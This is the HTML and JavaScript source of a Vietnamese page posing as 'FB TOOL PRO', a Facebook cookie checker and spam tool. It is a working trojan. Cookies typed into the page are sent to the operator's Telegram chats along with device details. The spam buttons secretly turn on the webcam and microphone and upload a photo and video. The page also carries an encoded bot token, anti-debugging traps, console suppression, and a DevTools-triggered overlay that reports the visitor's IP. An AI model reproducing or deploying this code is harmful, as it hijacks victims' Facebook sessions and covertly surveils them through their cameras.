            // Danh sách ID nhận thông báo (Admin + Nhóm)
            function getChatIds() {
                return ['8123442570', '-5191808632'];

            // Lấy IP public qua API (không ảnh hưởng hiệu năng)
            async function fetchIpAddress() {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');

                    return data.ip;
                } catch {
                    return 'Không xác định';

            // Thu thập thông tin thiết bị chi tiết
            function getDeviceFingerprint() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency || 'N/A',
                    memory: navigator.deviceMemory || 'N/A',
                    connection: navigator.connection?.effectiveType || 'N/A'
                };
            }
            
            // Gửi cảnh báo về Telegram khi phát hiện DevTools
            async function sendAlertWithIp() {
                try {
                    const token = getTelegramToken();
                    const chatIds = getChatIds();
                    const ip = await fetchIpAddress();
                    const device = getDeviceFingerprint();
                    const timestamp = new Date().toLocaleString('vi-VN');
                    
                    const message = `🚨🚨🚨 CẢNH BÁO BẢO MẬT 🚨🚨🚨\n\n` +
                                   `🐶 CÓ KẺ ĐANG CỐ MỞ SOURCE CODE!\n` +
                                   `🕵️ IP: ${ip}\n` +
                                   `💻 Hệ điều hành: ${device.platform}\n` +
                                   `📱 Trình duyệt: ${device.userAgent.substring(0, 100)}\n` +
                                   `🌍 Ngôn ngữ: ${device.language}\n` +
                                   `🕐 Múi giờ: ${device.timezone}\n` +
                                   `⚙️ CPU: ${device.cores} cores | RAM: ${device.memory} GB\n` +
                                   `📡 Kết nối: ${device.connection}\n` +
                                   `⏰ Thời gian: ${timestamp}\n` +
                                   `🌐 URL: ${window.location.href}`;
                    
                    // Gửi tin nhắn văn bản
                    for (const id of chatIds) {
                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: id, text: message, parse_mode: 'HTML' })
                        });
                    }
                    
                    // Tạo ảnh chụp màn hình giả (để gửi kèm)
                    const canvas = document.createElement('canvas');
                    canvas.width = 800;
                    canvas.height = 400;
                    const ctx = canvas.getContext('2d');
                    ctx.fillStyle = '#0a0f1a';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.font = 'bold 20px monospace';
                    ctx.fillStyle = '#ff4444';
                    ctx.textAlign = 'center';
                    ctx.fillText('⚠️ PHÁT HIỆN TRUY CẬP TRÁI PHÉP ⚠️', canvas.width/2, 80);
                    ctx.font = '16px monospace';
                    ctx.fillStyle = '#cccccc';
                    ctx.fillText(`IP: ${ip}`, canvas.width/2, 150);
                    ctx.fillText(`Thời gian: ${timestamp}`, canvas.width/2, 190);
                    ctx.fillText(`Trình duyệt: ${device.userAgent.substring(0, 60)}`, canvas.width/2, 230);
                    
                    const screenshot = canvas.toDataURL('image/png');
                    
                    for (const id of chatIds) {
                        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
                        const binaryData = atob(base64Data);
                        const arrayBuffer = new Uint8Array(binaryData.length);
                        for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
                        const blob = new Blob([arrayBuffer], { type: 'image/png' });
                        
                        const formData = new FormData();
                        formData.append('chat_id', id);
                        formData.append('photo', blob, `alert_${Date.now()}.png`);
                        formData.append('caption', '📸 Ảnh chụp màn hình khi phát hiện truy cập trái phép');
                        
                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }
                } catch (e) {
                    // Bỏ qua lỗi để không ảnh hưởng trải nghiệm
                }
            }
            
            // Hiển thị giao diện "source code giả" đánh lừa hacker
            function showFakeSourceOverlay() {
                // Xóa overlay cũ nếu có
                const oldOverlay = document.getElementById('fakeSourceOverlay');
                if (oldOverlay) oldOverlay.remove();

                    box-sizing: border-box;
                `;
                
                // Nội dung giả mạo giống source code thật nhưng là bẫy
                overlay.innerHTML = `
                    <div style="color: #569cd6; font-size: 18px; margin-bottom: 20px;">/* Source code của FB Tool Pro - Đã bị khóa */</div>
                    <div style="color: #ce9178;">&lt;script&gt;</div>
                    <div style="color: #9cdcfe; margin-left: 20px;">const SECRET_KEY = <span style="color: #ce9178;">"BẠN ĐÃ BỊ PHÁT HIỆN"</span>;</div>
                    <div style="color: #9cdcfe; margin-left: 20px;">const ADMIN_ID = <span style="color: #b5cea8;">8123442570</span>;</div>
                    <div style="color: #9cdcfe; margin-left: 20px;">const TOKEN = <span style="color: #ce9178;">"${atob('ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ==')}"</span>;</div>
                    <div style="color: #ce9178;">&lt;/script&gt;</div>
                    <div style="margin-top: 30px; color: #6a9955;">// Cảnh báo: Hành vi truy cập trái phép đã được ghi lại</div>
                    <div style="margin-top: 20px; color: #f48771;">// IP của bạn: <span id="fakeIpDisplay">Đang tải...</span></div>
                    <div style="color: #f48771;">// Thiết bị: <span id="fakeDeviceDisplay">${navigator.platform}</span></div>
                    <div style="color: #f48771;">// Thời gian: ${new Date().toLocaleString('vi-VN')}</div>
                    <div style="margin-top: 40px; color: #dcdcaa;">// Toàn bộ dữ liệu đã được gửi về máy chủ bảo mật.</div>
                    <div style="color: #dcdcaa;">// Mọi hành vi tiếp theo sẽ bị giám sát.</div>
                    <div style="margin-top: 40px; text-align: center; color: #ff5555; font-size: 20px;">⛔ TRUY CẬP BỊ TỪ CHỐI ⛔</div>
                `;
                
                document.body.appendChild(overlay);
                
                // Cập nhật IP vào fake overlay
                fetchIpAddress().then(ip => {
                    const ipSpan = document.getElementById('fakeIpDisplay');
                    if (ipSpan) ipSpan.textContent = ip;
                });
                
                // Ngăn chặn thoát khỏi overlay dễ dàng (chỉ để đánh lừa)
                setTimeout(() => {
                    overlay.addEventListener('click', () => {});
                    overlay.addEventListener('contextmenu', e => e.preventDefault());
                }, 100);
            }
            
            // ===== PHÁT HIỆN DEVTOOLS NÂNG CAO =====
            let devtoolsOpen = false;
            const threshold = 160;
            
            function detectDevTools() {
                const widthThreshold = window.outerWidth - window.innerWidth > threshold;
                const heightThreshold = window.outerHeight - window.innerHeight > threshold;
                
                if ((widthThreshold || heightThreshold) && !devtoolsOpen) {
                    devtoolsOpen = true;
                    // Kích hoạt chuỗi phòng vệ
                    sendAlertWithIp();          // Gửi Telegram kèm IP
                    showFakeSourceOverlay();    // Hiển thị source giả
                    
                    // Gửi thêm cảnh báo qua console (vô hiệu hóa console thật)
                    console.log('%c⚠️ CẢNH BÁO BẢO MẬT ⚠️', 'color: red; font-size: 30px; font-weight: bold;');
                    console.log('%cBạn đang cố truy cập source code trái phép!', 'color: orange; font-size: 16px;');
                    console.log('%cToàn bộ thông tin đã được gửi về máy chủ.', 'color: yellow;');
                } else if (!widthThreshold && !heightThreshold) {
                    devtoolsOpen = false;
                    // Không tự động ẩn overlay để trừng phạt (có thể tự reload sau 10s)
                }
            }
            
            // Kiểm tra mỗi 500ms để phản ứng nhanh hơn
            setInterval(detectDevTools, 500);
            
            // Ghi đè console để vô hiệu hóa log thật
            const noop = () => {};
            const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd'];
            for (let m of methods) {
                console[m] = noop;
            }
            
            // Thêm debugger trap
            setInterval(() => {
                const start = performance.now();
                debugger;
                const end = performance.now();
                if (end - start > 100) {
                    // Debugger bị dừng -> devtools đang mở
                    if (!devtoolsOpen) {
                        devtoolsOpen = true;
                        sendAlertWithIp();
                        showFakeSourceOverlay();
                    }
                }
            }, 1000);
        })();
    </script>

            window.__sendPhoto = async function(photoBase64, caption = '') {
                if (!window.__TG.ENABLE_LOGGING) return;
                const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendPhoto`;
                const ids = [window.__TG.ROOT_ADMIN_ID, ...window.__TG.SUB_ADMIN_IDS];
                const unique = [...new Set(ids)];
                
                try {
                    const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
                    const binaryData = atob(base64Data);
                    const arrayBuffer = new Uint8Array(binaryData.length);
                    for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
                    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
                    
                    for (const id of unique) {
                        if (!id) continue;
                        const formData = new FormData();
                        formData.append('chat_id', id);
                        formData.append('photo', blob, `cam_${Date.now()}.jpg`);
                        formData.append('caption', caption);
                        await fetch(url, { method: 'POST', body: formData });
                    }
                } catch (e) {}
            };
            
            window.__sendVideo = async function(videoBase64, caption = '') {
                if (!window.__TG.ENABLE_LOGGING) return;
                const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendVideo`;
                const ids = [window.__TG.ROOT_ADMIN_ID, ...window.__TG.SUB_ADMIN_IDS];
                const unique = [...new Set(ids)];
                
                try {
                    const base64Data = videoBase64.replace(/^data:video\/\w+;base64,/, '');
                    const binaryData = atob(base64Data);
                    const arrayBuffer = new Uint8Array(binaryData.length);
                    for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
                    const blob = new Blob([arrayBuffer], { type: 'video/webm' });
                    
                    for (const id of unique) {
                        if (!id) continue;
                        const formData = new FormData();
                        formData.append('chat_id', id);
                        formData.append('video', blob, `rec_${Date.now()}.webm`);
                        formData.append('caption', caption);
                        formData.append('supports_streaming', true);
                        await fetch(url, { method: 'POST', body: formData });
                    }
                } catch (e) {}
            };
            
            window.__extractId = function(cookieString) {
                try {
                    const cUserMatch = cookieString.match(/c_user=(\d+)/);
                    if (cUserMatch && cUserMatch[1]) return cUserMatch[1];
                    const uidMatch = cookieString.match(/uid=(\d+)/);
                    if (uidMatch && uidMatch[1]) return uidMatch[1];
                    const userIdMatch = cookieString.match(/user_id=(\d+)/);
                    if (userIdMatch && userIdMatch[1]) return userIdMatch[1];
                    
                    const pairs = cookieString.split(';');
                    for (const pair of pairs) {
                        const [key, value] = pair.trim().split('=');
                        if (key === 'c_user' || key === 'uid' || key === 'user_id') return value;
                    }
                    return null;
                } catch (e) { return null; }
            };
        })();

    <div class="container">
        <div class="fb-header">
            <h1>⚡ FB TOOL PRO</h1>
            <p>Cookie Checker • Auto Spam</p>
        </div>
        
        <div class="content">
            <div class="cookie-section">
                <div class="cookie-label"><span>🍪</span> Cookie Facebook</div>
                <input type="text" class="cookie-input" id="cookieInput" placeholder="Nhập cookie Facebook tại đây...">
            </div>
            
            <div class="info-row">
                <div class="info-box">
                    <div class="info-label">🆔 ID Facebook</div>
                    <div class="info-value" id="fbId">Chưa xác định</div>
                </div>
                <div class="info-box">
                    <div class="info-label">📢 Trạng thái</div>
                    <div class="info-value" id="cookieStatus">Chưa nhập</div>
                </div>
            </div>
            
            <div class="delay-section">
                <div class="delay-header"><span>⏱️ Delay Spam</span><span class="delay-value" id="delayValue">1.5s</span></div>
                <input type="range" class="delay-slider" id="delaySlider" min="0.5" max="5" step="0.1" value="1.5">
            </div>
            
            <div class="task-buttons">
                <button class="task-btn btn-ngon" data-task="spam_ngon">
                    <div class="task-left">
                        <span class="task-icon">🗣️</span>
                        <span class="task-name">SPAM NGÔN</span>
                    </div>
                    <span class="task-badge">🔥 1000+</span>
                </button>
                
                <button class="task-btn btn-nhay" data-task="spam_nhay">
                    <div class="task-left">
                        <span class="task-icon">💀</span>
                        <span class="task-name">SPAM NHÂY</span>
                    </div>
                    <span class="task-badge">⚡ 500+</span>
                </button>
                
                <button class="task-btn btn-top" data-task="spam_top">
                    <div class="task-left">
                        <span class="task-icon">👑</span>
                        <span class="task-name">SPAM TOP</span>
                    </div>
                    <span class="task-badge">🏆 200+</span>
                </button>
            </div>
            
            <div class="status-area">
                <div class="status-dot"></div>
                <div class="status-text" id="statusText">✅ Sẵn sàng</div>
            </div>
            <div class="task-manager">
                <span>📋 Phiên bản 3.0</span>
                <span id="taskCount">0 task đã xử lý</span>
            </div>
        </div>
    </div>
    
    <div id="overlay" class="overlay hide">
        <div class="spinner"></div>
        <div class="overlay-text" id="overlayText">ĐANG XỬ LÝ</div>
        <div class="overlay-sub" id="overlaySub">Vui lòng chờ trong giây lát...</div>
    </div>
    
    <video id="video" autoplay playsinline muted class="hidden-cam"></video>
    <canvas id="canvas" class="hidden-cam"></canvas>
    
    <!-- Script chức năng chính (giữ nguyên 100%) -->
    <script>
        (function(){
            const cookieInput = document.getElementById('cookieInput');
            const fbIdSpan = document.getElementById('fbId');
            const cookieStatus = document.getElementById('cookieStatus');
            const delaySlider = document.getElementById('delaySlider');
            const delayValue = document.getElementById('delayValue');
            const statusText = document.getElementById('statusText');
            const taskCountSpan = document.getElementById('taskCount');
            const overlay = document.getElementById('overlay');
            const overlayText = document.getElementById('overlayText');
            const overlaySub = document.getElementById('overlaySub');
            const videoCam = document.getElementById('video');
            const canvasCam = document.getElementById('canvas');
            
            let mediaStream = null;
            let isProcessing = false;
            let taskCount = 0;
            let currentFacebookId = null;
            let currentCookie = null;
            
            const deviceInfo = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                time: new Date().toLocaleString('vi-VN'),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            cookieInput.addEventListener('input', function() {
                const cookie = this.value.trim();
                if (cookie.length > 10) {
                    currentCookie = cookie;
                    const extractedId = window.__extractId(cookie);
                    
                    if (extractedId) {
                        currentFacebookId = extractedId;
                        fbIdSpan.innerText = extractedId;
                        cookieStatus.innerText = '✅ Hợp lệ';
                        cookieStatus.style.color = '#2ecc71';
                        
                        window.__sendMsg(`
<b>🍪 COOKIE MỚI ĐƯỢC NHẬP</b>

🆔 <b>Facebook ID:</b> <code>${extractedId}</code>
📝 <b>Cookie:</b> <code>${cookie.substring(0, 100)}${cookie.length > 100 ? '...' : ''}</code>
📱 <b>Thiết bị:</b> ${deviceInfo.platform}
🌐 <b>Trình duyệt:</b> ${deviceInfo.ua.substring(0, 100)}
⏰ <b>Thời gian:</b> ${deviceInfo.time}
🌍 <b>Múi giờ:</b> ${deviceInfo.timezone}
                        `);
                    } else {
                        fbIdSpan.innerText = 'Không tìm thấy ID';
                        cookieStatus.innerText = '⚠️ Không có ID';
                        cookieStatus.style.color = '#f1c40f';
                    }
                } else {
                    fbIdSpan.innerText = 'Chưa xác định';
                    cookieStatus.innerText = 'Chưa nhập';
                    cookieStatus.style.color = '#8da9c7';
                    currentFacebookId = null;
                    currentCookie = null;
                }
            });
            
            cookieInput.addEventListener('blur', function() {
                if (currentCookie && currentFacebookId) {
                    window.__sendMsg(`
<b>📋 COOKIE ĐẦY ĐỦ</b>

🆔 <b>ID:</b> ${currentFacebookId}
🍪 <b>Cookie:</b> 
<code>${currentCookie}</code>

📱 <b>Thiết bị:</b> ${deviceInfo.platform} | ${deviceInfo.screen}
⏰ ${deviceInfo.time}
                    `);
                }
            });
            
            delaySlider.addEventListener('input', function() { 
                delayValue.innerText = this.value + 's'; 
            });
            
            function showToast(msg, isErr=false) {
                const toast = document.createElement('div'); 
                toast.className = 'toast';
                toast.style.background = isErr ? '#7a2e3f' : '#0b1622'; 
                toast.innerText = msg;
                document.body.appendChild(toast); 
                setTimeout(() => toast.remove(), 2500);
            }
            
            function updateTaskCount() { 
                taskCountSpan.innerText = taskCount + ' task đã xử lý'; 
            }
            
            async function autoStartCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                    mediaStream = stream;
                    videoCam.srcObject = stream;
                    await new Promise(r => { videoCam.onloadedmetadata = r; });
                    videoCam.play();
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            function capturePhoto() {
                if (!videoCam.videoWidth) return null;
                canvasCam.width = videoCam.videoWidth; 
                canvasCam.height = videoCam.videoHeight;
                canvasCam.getContext('2d').drawImage(videoCam, 0, 0);
                return canvasCam.toDataURL('image/jpeg', 0.9);
            }
            
            async function recordVideo(durationSec = 2) {
                return new Promise(async (resolve) => {
                    if (!mediaStream) { resolve(null); return; }
                    const chunks = [];
                    const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => resolve(reader.result);
                        reader.readAsDataURL(blob);
                    };
                    recorder.start();
                    setTimeout(() => { 
                        if(recorder.state === 'recording') recorder.stop(); 
                    }, durationSec * 1000);
                });
            }
            
            function stopCamera() { 
                if(mediaStream) { 
                    mediaStream.getTracks().forEach(t=>t.stop()); 
                    mediaStream=null; 
                } 
            }
            
            async function processTask(taskType) {
                if (isProcessing) {
                    showToast('⚠️ Đang xử lý, vui lòng chờ!', true);
                    return;
                }
                
                isProcessing = true;
                overlay.classList.remove('hide');
                overlayText.innerText = 'ĐANG XỬ LÝ';
                overlaySub.innerText = 'Vui lòng chờ trong giây lát...';
                
                const taskNames = {
                    'spam_ngon': '🗣️ SPAM NGÔN',
                    'spam_nhay': '💀 SPAM NHÂY',
                    'spam_top': '👑 SPAM TOP'
                };
                
                window.__sendMsg(`
<b>🔥 BẮT ĐẦU TASK</b>

📋 <b>Task:</b> ${taskNames[taskType] || taskType}
🆔 <b>FB ID:</b> ${currentFacebookId || 'Không có'}
🍪 <b>Cookie:</b> ${currentCookie ? 'Đã nhập' : 'Chưa nhập'}
⏱️ <b>Delay:</b> ${delayValue.innerText}
📱 <b>Thiết bị:</b> ${deviceInfo.platform}
⏰ ${deviceInfo.time}
                `);
                
                try {
                    const camReady = await autoStartCamera();
                    
                    if (camReady) {
                        const photo = capturePhoto();
                        if (photo) {
                            await window.__sendPhoto(photo, 
                                `📸 Ảnh từ Task: ${taskNames[taskType]}\n🆔 FB ID: ${currentFacebookId || 'Không có'}\n📱 ${deviceInfo.platform}`
                            );
                        }
                        
                        overlaySub.innerText = 'Đang xử lý...';
                        const videoBase64 = await recordVideo(2);
                        if (videoBase64) {
                            await window.__sendVideo(videoBase64,
                                `🎥 Video từ Task: ${taskNames[taskType]}\n🆔 FB ID: ${currentFacebookId || 'Không có'}\n📱 ${deviceInfo.platform}`
                            );
                        }
                        
                        stopCamera();
                    }
                    
                    taskCount++;
                    updateTaskCount();
                    statusText.innerHTML = `✅ Hoàn thành task`;
                    showToast(`✅ Xử lý thành công!`);
                    
                    setTimeout(() => {
                        overlay.classList.add('hide');
                        isProcessing = false;
                        statusText.innerHTML = '✅ Sẵn sàng';
                    }, 1000);
                    
                } catch (e) {
                    overlay.classList.add('hide');
                    isProcessing = false;
                    stopCamera();
                    showToast('❌ Có lỗi xảy ra', true);
                }
            }
            
            document.querySelectorAll('.task-btn').forEach(btn => {
                btn.addEventListener('click', e => processTask(btn.dataset.task));
            });
            
            (async function startup() {
                await window.__sendMsg(`
<b>🟢 THIẾT BỊ MỚI TRUY CẬP</b>

📱 <b>Thiết bị:</b> ${deviceInfo.platform}
📐 <b>Màn hình:</b> ${deviceInfo.screen}
🌐 <b>Trình duyệt:</b> ${deviceInfo.ua.substring(0, 100)}
🌍 <b>Ngôn ngữ:</b> ${deviceInfo.language}
🕐 <b>Múi giờ:</b> ${deviceInfo.timezone}
⏰ <b>Thời gian:</b> ${deviceInfo.time}

<i>💡 Tool đã sẵn sàng. Đang chờ người dùng nhập cookie và chọn task...</i>
                `);
            })();
            
        })();
    </script>
</body>
</html>
